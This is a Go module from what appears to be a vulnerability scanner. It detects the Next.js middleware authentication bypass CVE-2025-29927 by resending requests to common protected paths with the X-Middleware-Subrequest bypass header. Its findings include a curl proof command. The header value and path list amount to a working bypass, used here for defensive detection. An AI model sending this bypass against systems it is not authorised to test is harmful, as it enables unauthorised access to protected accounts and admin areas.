// Package nextjs probes Next.js applications for CVE-2025-29927 — a middleware
// authentication bypass that allows an attacker to skip all Next.js middleware
// (including auth guards) by injecting the internal X-Middleware-Subrequest
// header. Affects Next.js < 15.2.3 / 14.x (patched March 2025).
//
// Detection strategy (surface-safe: only GET requests, no payloads):
//  1. Confirm Next.js by checking /_next/static/chunks/main.js (200).
//  2. Probe a set of common protected paths to establish a baseline status code.
//  3. Re-probe each path that returned 302/401/403 with the bypass header.
//  4. If the bypass yields 200 on any previously-blocked path, emit Critical.
package nextjs

import (
	"context"
	"crypto/tls"
	"fmt"
	"net"
	"net/http"
	"time"

	"github.com/stormbane/beacon/internal/finding"
	"github.com/stormbane/beacon/internal/module"
)

const scannerName = "nextjs"

// Scanner probes Next.js applications for CVE-2025-29927.
type Scanner struct{}

func New() *Scanner { return &Scanner{} }

func (s *Scanner) Name() string { return scannerName }

// bypassHeader is the internal Next.js routing signal that middleware injects
// when it forwards a subrequest. Sending it from the outside bypasses all
// middleware including auth guards (CVE-2025-29927).
const bypassHeader = "X-Middleware-Subrequest"
const bypassValue = "middleware:middleware:middleware:middleware:middleware"

// probePaths are the common paths that Next.js apps protect behind middleware.
// We probe these to find a 302/401/403 baseline before attempting the bypass.
var probePaths = []string{
	"/admin",
	"/dashboard",
	"/account",
	"/profile",
	"/settings",
	"/api/admin",
	"/api/user",
	"/api/me",
	"/api/private",
	"/api/internal",
}

func (s *Scanner) Run(ctx context.Context, asset string, scanType module.ScanType) ([]finding.Finding, error) {
	if scanType != module.ScanSurface && scanType != module.ScanDeep {
		return nil, nil
	}

	client := &http.Client{
		Timeout: 8 * time.Second,
		Transport: &http.Transport{
			TLSClientConfig: &tls.Config{InsecureSkipVerify: true}, //nolint:gosec
			DialContext:     (&net.Dialer{Timeout: 4 * time.Second}).DialContext,
		},
		CheckRedirect: func(*http.Request, []*http.Request) error {
			return http.ErrUseLastResponse
		},
	}

	// Step 1: confirm Next.js. We require /_next/static/chunks/main.js to
	// return 200 — this path is unique to Next.js and virtually never present
	// on non-Next.js servers.
	base := "https://" + asset
	if !isNextJS(ctx, client, base) {
		// Try HTTP for dev/staging environments.
		base = "http://" + asset
		if !isNextJS(ctx, client, base) {
			return nil, nil
		}
	}

	// Step 2 + 3: for each probe path, baseline then bypass.
	for _, path := range probePaths {
		url := base + path

		baseline, err := statusCode(ctx, client, url, nil)
		if err != nil {
			continue
		}
		// Only interesting if the baseline indicates access is restricted.
		if baseline != http.StatusFound &&
			baseline != http.StatusMovedPermanently &&
			baseline != http.StatusUnauthorized &&
			baseline != http.StatusForbidden {
			continue
		}

		bypass, err := statusCode(ctx, client, url, map[string]string{
			bypassHeader: bypassValue,
		})
		if err != nil {
			continue
		}

		if bypass == http.StatusOK {
			return []finding.Finding{{
				CheckID:  finding.CheckCVENextJSMiddlewareBypass,
				Module:   "surface",
				Scanner:  scannerName,
				Severity: finding.SeverityCritical,
				Title:    fmt.Sprintf("CVE-2025-29927: Next.js middleware bypass on %s", asset),
				Description: fmt.Sprintf(
					"%s is running Next.js with CVE-2025-29927 — an authentication bypass in the "+
						"middleware routing layer. Sending the internal X-Middleware-Subrequest header "+
						"causes the server to skip all middleware checks (auth, rate-limiting, IP allow-listing). "+
						"Path %q returned HTTP %d without the header but HTTP 200 with it. "+
						"Affects Next.js < 15.2.3 / < 14.2.25. Upgrade immediately.",
					asset, path, baseline,
				),
				Asset: asset,
				Evidence: map[string]any{
					"url":             url,
					"baseline_status": baseline,
					"bypass_status":   bypass,
					"bypass_header":   bypassHeader,
					"bypass_value":    bypassValue,
				},
				ProofCommand: fmt.Sprintf(
					"# Baseline (should return %d):\ncurl -sI '%s'\n"+
						"# Bypass (should return 200):\ncurl -sI -H '%s: %s' '%s'",
					baseline, url, bypassHeader, bypassValue, url,
				),
				DiscoveredAt: time.Now(),
			}}, nil
		}
	}
	return nil, nil
}

// isNextJS returns true when the asset serves /_next/static/chunks/main.js
// with a 200 status code, confirming a Next.js application.
func isNextJS(ctx context.Context, client *http.Client, base string) bool {
	code, err := statusCode(ctx, client, base+"/_next/static/chunks/main.js", nil)
	return err == nil && code == http.StatusOK
}

// statusCode makes a GET request and returns the HTTP status code.
func statusCode(ctx context.Context, client *http.Client, url string, headers map[string]string) (int, error) {
	req, err := http.NewRequestWithContext(ctx, http.MethodGet, url, nil)
	if err != nil {
		return 0, err
	}
	for k, v := range headers {
		req.Header.Set(k, v)
	}
	resp, err := client.Do(req)
	if err != nil {
		return 0, err
	}
	resp.Body.Close()
	return resp.StatusCode, nil
}
